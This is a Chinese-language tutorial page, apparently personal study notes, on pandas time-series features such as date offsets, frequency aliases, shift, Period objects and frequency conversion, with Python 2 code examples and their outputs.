<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pandas.tseries.offsets <span class="keyword">import</span> Hour, Minute</span><br><span class="line">hour = Hour()</span><br><span class="line"><span class="keyword">print</span> hour</span><br><span class="line"></span><br><span class="line"><span class="comment">#传入一个整数，可定义偏移量的倍数</span></span><br><span class="line">four_hours = Hour(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> four_hours</span><br><span class="line"></span><br><span class="line"><span class="comment">#一般来说，无需显示创建这样的对象，只需使用诸如"H"和"4H"这样的字符串别名即可</span></span><br><span class="line"><span class="keyword">print</span> pd.date_range(<span class="string">'1/1/2000'</span>, <span class="string">'1/3/2000 23:59'</span>, freq = <span class="string">'4h'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#大部分偏移量可以用加法来连接</span></span><br><span class="line"><span class="keyword">print</span> Hour(<span class="number">2</span>) + Minute(<span class="number">30</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#同理，也可以传入频率字符串，这类字符串会被解析为等效的表达式</span></span><br><span class="line"><span class="keyword">print</span> pd.date_range(<span class="string">'1/1/2000'</span>, periods = <span class="number">6</span>, freq = <span class="string">'1h30min'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;Hour&gt;</span><br><span class="line">&lt;4 * Hours&gt;</span><br><span class="line">DatetimeIndex([&apos;2000-01-01 00:00:00&apos;, &apos;2000-01-01 04:00:00&apos;,</span><br><span class="line">               &apos;2000-01-01 08:00:00&apos;, &apos;2000-01-01 12:00:00&apos;,</span><br><span class="line">               &apos;2000-01-01 16:00:00&apos;, &apos;2000-01-01 20:00:00&apos;,</span><br><span class="line">               &apos;2000-01-02 00:00:00&apos;, &apos;2000-01-02 04:00:00&apos;,</span><br><span class="line">               &apos;2000-01-02 08:00:00&apos;, &apos;2000-01-02 12:00:00&apos;,</span><br><span class="line">               &apos;2000-01-02 16:00:00&apos;, &apos;2000-01-02 20:00:00&apos;,</span><br><span class="line">               &apos;2000-01-03 00:00:00&apos;, &apos;2000-01-03 04:00:00&apos;,</span><br><span class="line">               &apos;2000-01-03 08:00:00&apos;, &apos;2000-01-03 12:00:00&apos;,</span><br><span class="line">               &apos;2000-01-03 16:00:00&apos;, &apos;2000-01-03 20:00:00&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=&apos;4H&apos;)</span><br><span class="line"></span><br><span class="line">&lt;150 * Minutes&gt;</span><br><span class="line"></span><br><span class="line">DatetimeIndex([&apos;2000-01-01 00:00:00&apos;, &apos;2000-01-01 01:30:00&apos;,</span><br><span class="line">               &apos;2000-01-01 03:00:00&apos;, &apos;2000-01-01 04:30:00&apos;,</span><br><span class="line">               &apos;2000-01-01 06:00:00&apos;, &apos;2000-01-01 07:30:00&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=&apos;90T&apos;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>有些列如”M”(日历月末), “BM”(每月最后一个工作日)为锚点偏移量(anchored<br>offset)</p>
</li>
<li><p>时间序列的基础频率</p>
<p>|     别名              |  偏移量累性格                    |    说明                                               |<br>|—————————-|———————————|—————————————————————————-|<br>| D                 | Day                  | 每日历日                                          |<br>| B                 | BusinessDay          | 每工作日                                          |<br>| H                 | Hour                 | 每小时                                            |<br>| T或min            | Minute               | 每分                                              |<br>| S                 | Second               | 每秒                                              |<br>| L或ms             | Milli                | 每毫秒(千分之一秒)                                |<br>| U                 | Micro                | 每微秒(每百万分之一秒)                            |<br>| M                 | MonthEnd             | 每月最后一个日历日                                |<br>| BM                | BusinessMonthEnd     | 每月最后一个工作日                                |<br>| MS                | MonthBegin           | 每月第一个日历日                                  |<br>| BMS               | BusinessMonthBegin   | 每月第一个工作日                                  |<br>| W-MON W-TUE …     | week                 | 指定的星期几                                      |<br>|                   |                      | (MON TUE　WED THU FIR SAT SUM)开始算起，每周      |<br>| WOM-1MON WOM-2MON | WeekOfMonth          | 产生每月第一， 第二的星期几                       |<br>|                   |                      | 列如 WOM-3FRI表示每月第三个星期五                 |<br>| Q-JAN Q-FEB       | quarterEnd           | 对于以指定月份                                    |<br>|                   |                      | (JAN FEB MAR APR MAY JUN JUL AUG SEP OCT NOV DEC) |<br>|                   |                      | 结束的年度，每季度最后一月的最后一个日历日        |<br>| BQ-JAN            | BusinessQuarterEnd   | 对于指定月份结束的年度                            |<br>|                   |                      | 每季度最后一月的最后一个工作日                    |<br>| QS-JAN            | QuarterBegin         | 对于以指定月份结束的年度                          |<br>|                   |                      | 每季度最后一月的第一个日历日                      |<br>| BQS-JAN           | BusinessQuarterBegin | 对于以指定月份结束的年度，                        |<br>|                   |                      | 每季度最后一月的第一个工作日                      |<br>| A-JAN             | YearEnd              | 每年指定月份的租后一个日历日                      |<br>| BA-JAN            | BusinessYearEnd      | 每年指定月份的最后一个工作日                      |<br>| AS-JAN            | YearBegin            | 每年指定月份的第一个日历日                        |<br>| BAS-JAN           | BusinessYearBegin    | 每年指定月份的第一个工作日                        |</p>
</li>
<li><p>WOM日期</p>
<ol>
<li><p>WOM(Week of<br>Month)是一种非常实用的平率类，它以WOM开头，它能使你获得诸如”每月第三个星期五”之类的日期</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rng = pd.date_range(<span class="string">'1/1/2012'</span>, <span class="string">'/9/1/2012'</span>, freq = <span class="string">'WOM-3FRI'</span>)</span><br><span class="line"><span class="keyword">print</span> list(rng)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Timestamp(&apos;2012-01-20 00:00:00&apos;, offset=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-02-17 00:00:00&apos;, offset=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-03-16 00:00:00&apos;, offset=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-04-20 00:00:00&apos;, offset=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-05-18 00:00:00&apos;, offset=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-06-15 00:00:00&apos;, offset=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-07-20 00:00:00&apos;, offset=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-08-17 00:00:00&apos;, offset=&apos;WOM-3FRI&apos;)]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h3 id="移动-超前和滞后-数据"><a href="#移动-超前和滞后-数据" class="headerlink" title="移动(超前和滞后)数据"></a>移动(超前和滞后)数据</h3><ol>
<li><p>移动(shifting)指的是沿着时间轴将数据前移或后移</p>
</li>
<li><p>Series和DataFrame都有一个shift方法用来执行单纯的前移或后移操作，保持索引不变</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ts = pd.Series(np.random.randn(<span class="number">4</span>),</span><br><span class="line">               index = pd.date_range(<span class="string">'1/1/2000'</span>, periods = <span class="number">4</span>, freq = <span class="string">"M"</span>))</span><br><span class="line"><span class="keyword">print</span> ts</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts.shift(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts.shift(<span class="number">-2</span>)</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">2000-01-31    0.008511</span><br><span class="line">2000-02-29   -0.086778</span><br><span class="line">2000-03-31   -0.272538</span><br><span class="line">2000-04-30    0.594061</span><br><span class="line">Freq: M, dtype: float64</span><br><span class="line"></span><br><span class="line">2000-01-31         NaN</span><br><span class="line">2000-02-29         NaN</span><br><span class="line">2000-03-31    0.008511</span><br><span class="line">2000-04-30   -0.086778</span><br><span class="line">Freq: M, dtype: float64</span><br><span class="line"></span><br><span class="line">2000-01-31   -0.272538</span><br><span class="line">2000-02-29    0.594061</span><br><span class="line">2000-03-31         NaN</span><br><span class="line">2000-04-30         NaN</span><br><span class="line">Freq: M, dtype: float64</span><br></pre></td></tr></table></figure>
<ol>
<li><p>shift通常用于计算一个或多个时间序列中的百分比变化</p>
<p>列如 ts/ts.shift(1) -1</p>
</li>
<li><p>由于单纯的移位操作不会修改索引，所以部分数据会丢失</p>
</li>
<li><p>如果频率已知，可以将其传给shift以便实现对时间戳进行位移而不是对数据的简单位移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> ts.shift(<span class="number">2</span>, freq = <span class="string">'M'</span>) <span class="comment">#会按频率移动日期，但不移动数据</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts.shift(<span class="number">3</span>, freq = <span class="string">'D'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts.shift(<span class="number">1</span>, freq= <span class="string">'3D'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts.shift(<span class="number">1</span>, freq = <span class="string">'90T'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">2000-03-31    0.008511</span><br><span class="line">2000-04-30   -0.086778</span><br><span class="line">2000-05-31   -0.272538</span><br><span class="line">2000-06-30    0.594061</span><br><span class="line">Freq: M, dtype: float64</span><br><span class="line"></span><br><span class="line">2000-02-03    0.008511</span><br><span class="line">2000-03-03   -0.086778</span><br><span class="line">2000-04-03   -0.272538</span><br><span class="line">2000-05-03    0.594061</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">2000-02-03    0.008511</span><br><span class="line">2000-03-03   -0.086778</span><br><span class="line">2000-04-03   -0.272538</span><br><span class="line">2000-05-03    0.594061</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">2000-01-31 01:30:00    0.008511</span><br><span class="line">2000-02-29 01:30:00   -0.086778</span><br><span class="line">2000-03-31 01:30:00   -0.272538</span><br><span class="line">2000-04-30 01:30:00    0.594061</span><br><span class="line">Freq: M, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>通过偏移量对日期进行位移</p>
<ol>
<li><p>pandas的日期偏移量可以用于datetime或Timestamp对象上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pandas.tseries.offsets <span class="keyword">import</span> Day, MonthEnd</span><br><span class="line">now = datetime(<span class="number">2011</span>,<span class="number">11</span>, <span class="number">17</span>)</span><br><span class="line"><span class="keyword">print</span> now + <span class="number">3</span> * Day()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2011-11-20 00:00:00</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果加的是锚点偏移量，第一次增量会将原本日期向前滚动到符合频率规则的下个日期</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> now + MonthEnd() <span class="comment">#now日期之后的第一个符合MonthEnd的日期</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> now + MonthEnd(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2011-11-30 00:00:00</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2011-12-31 00:00:00</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过锚点偏移量的rollforward和rollback方法，可以显示的将日期向前或向后”滚动”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset = MonthEnd()</span><br><span class="line"><span class="keyword">print</span> offset.rollforward(now) <span class="comment">#向前增加偏移量类似于 now + offset</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> offset.rollback(now) <span class="comment">#向后增加偏移量 类似于 now - offset</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2011-11-30 00:00:00</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2011-10-31 00:00:00</span><br></pre></td></tr></table></figure>
</li>
<li><p>结合groupby使用 “滚动”方法 <span class="tag" tag-name="没明白"><span class="smallcaps">没明白</span>&lt;/span&gt;</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ts = pd.Series(np.random.randn(<span class="number">20</span>),</span><br><span class="line">               index = pd.date_range(<span class="string">'1/15/2000'</span>, periods = <span class="number">20</span>, freq = <span class="string">'4d'</span>))</span><br><span class="line"><span class="keyword">print</span> ts.groupby(offset.rollforward).mean()</span><br><span class="line"></span><br><span class="line"><span class="comment">#更简单的和快速的方式是使用resample</span></span><br><span class="line"><span class="keyword">print</span> ts.resample(<span class="string">'M'</span>, how = <span class="string">'mean'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2000-01-31   -0.144672</span><br><span class="line">2000-02-29   -0.859409</span><br><span class="line">2000-03-31    0.291670</span><br><span class="line">dtype: float64</span><br><span class="line">2000-01-31   -0.144672</span><br><span class="line">2000-02-29   -0.859409</span><br><span class="line">2000-03-31    0.291670</span><br><span class="line">Freq: M, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h2 id="时区处理-待补充-lt-span-gt-时区处理"><a href="#时区处理-待补充-lt-span-gt-时区处理" class="headerlink" title="时区处理 待补充&lt;/span&gt; [时区处理]"></a>时区处理 <span class="tag" tag-name="待补充"><span class="smallcaps">待补充</span>&lt;/span&gt; [时区处理]</span></h2><h3 id="时区很多人都选择协调世界时-UTC-，时区是以UTC偏移量来表示的"><a href="#时区很多人都选择协调世界时-UTC-，时区是以UTC偏移量来表示的" class="headerlink" title="时区很多人都选择协调世界时(UTC)，时区是以UTC偏移量来表示的"></a>时区很多人都选择协调世界时(UTC)，时区是以UTC偏移量来表示的</h3><h2 id="时期及其算术运算"><a href="#时期及其算术运算" class="headerlink" title="时期及其算术运算"></a>时期及其算术运算</h2><h3 id="时期-period-表示时间区间"><a href="#时期-period-表示时间区间" class="headerlink" title="时期(period)表示时间区间"></a>时期(period)表示时间区间</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">p = pd.Period(<span class="number">2007</span>, freq = <span class="string">'A-DEC'</span>)</span><br><span class="line"><span class="keyword">print</span> p <span class="comment">#表示从2007 1月1号 到 2007 12月31日之间的整段时间</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对Period对象加上或减去整数，则可以对频率进行位移</span></span><br><span class="line"><span class="keyword">print</span> p + <span class="number">5</span></span><br><span class="line"><span class="keyword">print</span> p - <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对于两个Period对象，如果拥有相同频率，则他们的差会是它们之间的单位数量</span></span><br><span class="line"><span class="keyword">print</span> pd.Period(<span class="string">'2014'</span>, freq = <span class="string">'A-DEC'</span>) - p <span class="comment">#单位数 也就是7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#period_range函数可以创造规则的时间范围</span></span><br><span class="line">rng = pd.period_range(<span class="string">'1/1/2000'</span>, <span class="string">'6/30/2000'</span>, freq = <span class="string">'M'</span>)</span><br><span class="line"><span class="keyword">print</span> rng</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PeriodIndex类保存了一组Period，它可以在任何pandas数据结构中被用作轴索引</span></span><br><span class="line"><span class="keyword">print</span> pd.Series(np.random.randn(<span class="number">6</span>), index = rng)</span><br><span class="line"></span><br><span class="line"><span class="comment">#PeriodIndex类的构造函数还允许直接使用一组字符串 # 不明白</span></span><br><span class="line">values = [<span class="string">'2001Q3'</span>, <span class="string">'2002Q2'</span>, <span class="string">'2003Q1'</span>]</span><br><span class="line">index = pd.PeriodIndex(values, freq = <span class="string">'Q-DEC'</span>)</span><br><span class="line"><span class="keyword">print</span> index</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2007</span><br><span class="line"></span><br><span class="line">2012</span><br><span class="line">2005</span><br><span class="line">7</span><br><span class="line">PeriodIndex([&apos;2000-01&apos;, &apos;2000-02&apos;, &apos;2000-03&apos;, &apos;2000-04&apos;, &apos;2000-05&apos;, &apos;2000-06&apos;], dtype=&apos;int64&apos;, freq=&apos;M&apos;)</span><br><span class="line"></span><br><span class="line">2000-01    1.254038</span><br><span class="line">2000-02   -0.217865</span><br><span class="line">2000-03    0.933366</span><br><span class="line">2000-04   -0.439085</span><br><span class="line">2000-05   -1.077546</span><br><span class="line">2000-06    0.428148</span><br><span class="line">Freq: M, dtype: float64</span><br><span class="line">PeriodIndex([&apos;2001Q3&apos;, &apos;2002Q2&apos;, &apos;2003Q1&apos;], dtype=&apos;int64&apos;, freq=&apos;Q-DEC&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="时期的频率转换"><a href="#时期的频率转换" class="headerlink" title="时期的频率转换"></a>时期的频率转换</h3><ol>
<li><p>Period和PeriodIndex对象都可以通过其asfreq方法被转换成别的频率</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将一个年度时期，转换成当年年初或年末的一个月度时期</span></span><br><span class="line">p = pd.Period(<span class="string">'2007'</span>, freq = <span class="string">'A-DEC'</span>)</span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> p.asfreq(<span class="string">'M'</span>, how = <span class="string">'start'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> p.asfreq(<span class="string">'M'</span>, how = <span class="string">'end'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Period("2007", freq = 'A-DEC')看做一个被划分为多个月度时期的时间段中的游标</span></span><br><span class="line">p = pd.Period(<span class="string">'2007'</span>, freq = <span class="string">'A-JUN'</span>)</span><br><span class="line"><span class="keyword">print</span> p.asfreq(<span class="string">'M'</span>, <span class="string">'start'</span>) <span class="comment">#变成结尾日期的一年前的日期了 # 不明白</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> p.asfreq(<span class="string">'M'</span>, <span class="string">'end'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2007</span><br><span class="line"></span><br><span class="line">2007-01</span><br><span class="line"></span><br><span class="line">2007-12</span><br><span class="line"></span><br><span class="line">2006-07</span><br><span class="line"></span><br><span class="line">2007-06</span><br></pre></td></tr></table></figure>
<ol>
<li><p>将高频率转换成低频率时，超时期(superperiod)是由子时期(subperiod)所属的未知决定</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在A-JUN平率中 月份 "2007年8月"实际上是属于周期"2009年的"</span></span><br><span class="line">p = pd.Period(<span class="string">'2007-08'</span>, <span class="string">'M'</span>)</span><br><span class="line"><span class="keyword">print</span> p.asfreq(<span class="string">'A-JUN'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#PeriodIndex或TimeSeries的频率转换方式也是如此</span></span><br><span class="line">rng = pd.period_range(<span class="string">'2006'</span>, <span class="string">'2009'</span>, freq = <span class="string">'A-DEC'</span>)</span><br><span class="line">ts = pd.Series(np.random.randn(len(rng)), index = rng)</span><br><span class="line"><span class="keyword">print</span> ts</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts.asfreq(<span class="string">'M'</span>, how = <span class="string">'start'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts.asfreq(<span class="string">'B'</span>, how = <span class="string">'end'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">2008</span><br><span class="line">2006    0.035359</span><br><span class="line">2007   -0.089152</span><br><span class="line">2008   -0.334353</span><br><span class="line">2009   -0.935191</span><br><span class="line">Freq: A-DEC, dtype: float64</span><br><span class="line"></span><br><span class="line">2006-01    0.035359</span><br><span class="line">2007-01   -0.089152</span><br><span class="line">2008-01   -0.334353</span><br><span class="line">2009-01   -0.935191</span><br><span class="line">Freq: M, dtype: float64</span><br><span class="line"></span><br><span class="line">2006-12-29    0.035359</span><br><span class="line">2007-12-31   -0.089152</span><br><span class="line">2008-12-31   -0.334353</span><br><span class="line">2009-12-31   -0.935191</span><br><span class="line">Freq: B, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h3 id="按季度计算的时期频率"><a href="#按季度计算的时期频率" class="headerlink" title="按季度计算的时期频率"></a>按季度计算的时期频率</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">p = pd.Period(<span class="string">'2012Q4'</span>, freq = <span class="string">'Q-JAN'</span>) <span class="comment">#表示p是以1月作为 2012的财年末 就是11月到1月</span></span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.asfreq(<span class="string">'D'</span>, <span class="string">'start'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.asfreq(<span class="string">'D'</span>, <span class="string">'end'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#要获取该季度第二个工作日下午4点的时间戳</span></span><br><span class="line">p4pm = (p.asfreq(<span class="string">'B'</span>, <span class="string">'e'</span>) <span class="number">-1</span>).asfreq(<span class="string">'T'</span>, <span class="string">'s'</span>) + <span class="number">16</span> * <span class="number">60</span></span><br><span class="line"><span class="keyword">print</span> p4pm</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> p4pm.to_timestamp()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#period_range可以用于季度性范围，范围的蒜素预算可跟上面一样</span></span><br><span class="line">rng = pd.period_range(<span class="string">'2011Q3'</span>, <span class="string">'2012Q4'</span>, freq = <span class="string">'Q-JAN'</span>)</span><br><span class="line">ts = pd.Series(np.arange(len(rng)), index = rng)</span><br><span class="line"><span class="keyword">print</span> ts</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line">new_rng = (rng.asfreq(<span class="string">'B'</span>, <span class="string">'e'</span>) - <span class="number">1</span>).asfreq(<span class="string">'T'</span>, <span class="string">'s'</span>) + <span class="number">16</span> *<span class="number">60</span></span><br><span class="line">ts.index = new_rng.to_timestamp()</span><br><span class="line"><span class="keyword">print</span> ts</span><br></pre></td></tr></table></figure>
